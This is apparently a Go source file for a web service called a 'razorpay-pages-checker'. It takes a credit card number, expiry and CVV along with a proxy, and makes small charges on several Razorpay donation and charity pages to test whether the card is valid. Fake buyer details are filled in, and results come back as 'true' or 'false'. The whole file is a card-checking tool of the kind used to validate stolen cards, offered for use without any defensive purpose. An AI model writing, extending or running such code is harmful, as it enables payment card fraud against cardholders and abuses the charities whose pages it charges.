package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"
)

type APIResponse struct {
	CC       string `json:"cc"`
	Gateway  string `json:"Gateway"`
	Response string `json:"Response"`
	Price    string `json:"Price"`
	Currency string `json:"Currency"`
	Status   string `json:"Status"`
	Message  string `json:"Message"`
	Time     string `json:"Time"`
	Proxy    string `json:"Proxy"`
}

func main() {
	port := os.Getenv("RAZORPAY_PORT")
	if port == "" {
		port = "8086"
	}

	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"status":"ok","service":"razorpay-pages-checker"}`))
	})

	http.HandleFunc("/shopify", checkHandler) // mapped for backwards compatibility
	http.HandleFunc("/razorpay", checkHandler)

	fmt.Printf("======================================================================\n")
	fmt.Printf("  Razorpay Pages API Server\n")
	fmt.Printf("======================================================================\n")
	fmt.Printf("  Listening on http://0.0.0.0:%s\n\n", port)
	fmt.Printf("  Endpoint:\n")
	fmt.Printf("    GET /razorpay?cc=...&site=...&proxy=...&amount=...\n")
	fmt.Printf("======================================================================\n")

	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, nil))
}

func checkHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	startTime := time.Now()
	ccLine := r.URL.Query().Get("cc")
	siteURL := r.URL.Query().Get("site")
	proxyURL := r.URL.Query().Get("proxy")
	amountStr := r.URL.Query().Get("amount")

	defaultSites := []string{
		"https://pages.razorpay.com/satgurucharity",
		"https://pages.razorpay.com/agape",
		"https://pages.razorpay.com/epdonation",
		"https://pages.razorpay.com/saveourearth",
		"https://pages.razorpay.com/exceldigital",
		"https://pages.razorpay.com/pl_HB3M7WgxCaYkO2/view",
	}

	if ccLine == "" {
		w.WriteHeader(http.StatusBadRequest)
		_, _ = w.Write([]byte(`{"error":"Missing cc parameter"}`))
		return
	}

	sitesToTry := defaultSites
	if siteURL != "" {
		sitesToTry = []string{siteURL}
	}

	// Default custom amount (INR)
	customAmount := 10
	if amountStr != "" {
		if val, err := strconv.Atoi(amountStr); err == nil && val > 0 {
			customAmount = val
		}
	}

	// Parse credit card details
	cardNo, expMonth, expYear, cvv, ok := parseCC(ccLine)
	if !ok {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "INVALID_CARD_DETAILS",
			Status:   "false",
			Message:  "Failed to parse credit card line",
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	// Initialize HTTP Client
	client, err := newClient(proxyURL, 15*time.Second)
	if err != nil {
		resp := APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: "PROXY_ERROR",
			Status:   "false",
			Message:  fmt.Sprintf("Failed to initialize proxy client: %v", err),
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}
		jsonResp, _ := json.Marshal(resp)
		_, _ = w.Write(jsonResp)
		return
	}

	var finalResp APIResponse
	var lastErr string

	for _, currentSite := range sitesToTry {
		session := &RazorpaySession{
			Client:       client,
			ProxyURL:     proxyURL,
			PageURL:      currentSite,
			CustomAmount: customAmount,
		}

		if err := session.ScrapePage(); err != nil {
			lastErr = fmt.Sprintf("Scrape failed on %s: %v", currentSite, err)
			continue
		}

		orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "9876543210")
		if err != nil {
			lastErr = fmt.Sprintf("Order creation failed on %s: %v", currentSite, err)
			continue
		}

		result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
		if err != nil {
			lastErr = fmt.Sprintf("Payment submission error on %s: %v", currentSite, err)
			continue
		}

		if result.Status == "SiteError" && len(sitesToTry) > 1 {
			lastErr = fmt.Sprintf("Site error on %s: %s", currentSite, result.Message)
			continue
		}

		status := "false"
		switch result.Status {
		case "success", "3ds":
			status = "true"
		case "SiteError":
			status = "SiteError"
		}

		finalResp = APIResponse{
			CC:       ccLine,
			Gateway:  "Razorpay Pages",
			Response: result.Response,
			Price:    formatAmount(session.ItemAmount),
			Currency: session.Currency,
			Status:   status,
			Message:  result.Message,
			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
			Proxy:    getProxyLabel(proxyURL),
		}

		jsonResp, _ := json.Marshal(finalResp)
		_, _ = w.Write(jsonResp)
		return
	}

	// If all sites failed
	finalResp = APIResponse{
		CC:       ccLine,
		Gateway:  "Razorpay Pages",
		Response: "SITE_ERROR",
		Status:   "SiteError",
		Message:  lastErr,
		Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
		Proxy:    getProxyLabel(proxyURL),
	}
	jsonResp, _ := json.Marshal(finalResp)
	_, _ = w.Write(jsonResp)
}

func getProxyLabel(proxyURL string) string {
	if proxyURL == "" {
		return "Direct"
	}
	return "Live"
}
